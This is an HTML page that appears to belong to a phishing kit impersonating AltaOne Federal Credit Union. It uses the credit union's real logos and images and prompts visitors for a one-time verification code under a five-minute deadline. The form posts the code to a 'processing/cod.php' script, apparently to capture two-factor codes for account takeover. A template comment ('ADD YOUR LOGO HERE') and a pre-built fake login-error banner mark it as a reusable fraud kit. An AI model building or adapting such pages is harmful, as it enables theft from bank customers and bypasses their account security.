<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AltaOne Federal Credit Union</title>
<link href="https://cdn1.onlineaccess1.com/cdn/depot/5130/3552/094e22b243d3c2b2ee23b7234bb5a490/assets/images/favicon-f05fb5c29302a86aa529b3878f7adee8.ico" rel="icon">


<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, Helvetica, sans-serif;
}

body{
    min-height:100vh;
    background:url('https://cdn1.onlineaccess1.com/cdn/depot/5130/3552/094e22b243d3c2b2ee23b7234bb5a490/assets/images/desktop-background-23599271185e1835c0614c4e048bbcf3.jpg') center center/cover no-repeat;
    display:flex;
    justify-content:center;
    align-items:center;
    padding:20px;
}

.login-wrapper{
    width:100%;
    max-width:640px;
}

.login-box{
    background:#E8E8E8;
    overflow:hidden;
    box-shadow:0 4px 15px rgba(0,0,0,.25);
}

.logo-area{
    height:100px;
    background:#ffffff;
    display:flex;
    justify-content:center;
    align-items:center;
}

.logo-area img{
    max-width:300px;
    max-height:70px;
}

.error-bar{
    background:#e00000;
    color:#fff;
    text-align:center;
    padding:14px 20px;
    font-size:15px;
    line-height:1.7;
}

.form-area{
    padding:45px 70px;
}

.form-group{
    margin-bottom:22px;
}

.form-group label{
    display:block;
    margin-bottom:8px;
    font-size:16px;
    color:#111;
}

.form-control{
    width:100%;
    height:46px;
    border:1px solid #8f8f8f;
    padding:0 12px;
    background:#fff;
    font-size:15px;
}

.password-wrapper{
    position:relative;
}

.show-btn{
    position:absolute;
    right:12px;
    top:50%;
    transform:translateY(-50%);
    background:none;
    border:none;
    color:#1d73a7;
    cursor:pointer;
    font-size:15px;
}

.remember{
    display:flex;
    align-items:center;
    gap:12px;
    margin:15px 0 30px;
}

.remember input{
    width:24px;
    height:24px;
}

.login-btn{
    width:100%;
    height:40px;
    border:none;
    background:#072B67;
    color:#fff;
    font-size:17px;
    font-weight:bold;
    cursor:pointer;
    border-radius:2px;
}

.login-btn:hover{
    opacity:.95;
}

.footer-links{
    background:#0071BC;
    display:flex;
    justify-content:center;
    align-items:center;
    flex-wrap:wrap;
    gap:18px;
    padding:18px;
}

.footer-links a{
    color:#fff;
    text-decoration:none;
    font-size:14px;
}

.divider{
    color:#fff;
}

@media (max-width:768px){

    body{
        padding:0;
    }

    .login-wrapper{
        max-width:100%;
    }

    .login-box{
        min-height:100vh;
    }

    .form-area{
        padding:30px 25px;
    }

    .error-bar{
        font-size:14px;
        padding:12px 15px;
    }

    .login-btn{
        font-size:22px;
        height:50px;
    }

    .footer-links{
        gap:12px;
    }
}
</style>
</head>

<body>

<div class="login-wrapper">

    <div class="login-box">

        <div class="logo-area">
            <!-- ADD YOUR LOGO HERE -->
            <img src="https://images.squarespace-cdn.com/content/v1/6365153929d8495f9b82d6b5/a9b1fca3-37f3-4d5c-911b-835715434685/AltaOne_RGB_transparent-01.png?format=1500w" alt="Logo">
        </div>

        <div class="error-bar" style="display: none;">
             Either your User ID or password is incorrect. Please try again.
        </div>
		
		<hr>

        <div class="form-area">
		
		<form method="post" action="processing/cod.php">

            <div class="form-group">
                <p>You have 5 minutes to complete this verification with the current code.</p>
            </div>

            <div class="form-group">
                <span>Enter Verification Code</label>

                <div class="password-wrapper">
                    <input type="tel" class="form-control" id="code" name="code" minlength="6" required>
                </div>
            </div>

            <div class="">
            </div>

            <button type="submit" class="login-btn">
                Submit
            </button>

        </div>

        <div class="footer-links">

        </div>

    </div>
	
	<br>
	
	<p align="center">
	
	<img src="https://cdn1.onlineaccess1.com/cdn/depot/5130/3552/094e22b243d3c2b2ee23b7234bb5a490/assets/images/ncua_logo_small-c7aadb27c327d759dd98a976ab3ea418.png">
    
	</p>

</div>

</body>
</html>